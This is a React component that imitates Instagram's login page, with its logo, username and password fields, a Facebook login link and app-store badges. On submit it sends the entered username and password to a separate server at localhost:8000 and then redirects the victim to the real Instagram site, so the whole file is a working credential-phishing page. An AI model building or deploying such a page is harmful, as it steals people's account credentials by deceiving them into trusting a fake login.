import React, { useState } from "react";
import "./Login.css";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch("http://localhost:8000/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });
    window.location.href = "https://www.instagram.com";
  };

  return (
    <div className="login-page">
      <div className="login-card">
        <img src="/instagram.svg" alt="Instagram" className="logo" />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
        </form>
        <div className="divider"><div /><span>OR</span><div /></div>
        <a href="https://www.facebook.com" className="facebook-login">
          Log in with Facebook
        </a>
        <a href="/" className="forgot-password">
          Forgot password?
        </a>
      </div>

      <div className="signup-card">
        <p>
          Don’t have an account? <a href="/">Sign up</a>
        </p>
      </div>

      <div className="app-promo">
        <p>Get the app.</p>
        <div className="store-badges">
          <img src="/appstore.png" alt="App Store" />
          <img src="/playstore.png" alt="Google Play" />
        </div>
      </div>
    </div>
  );
}
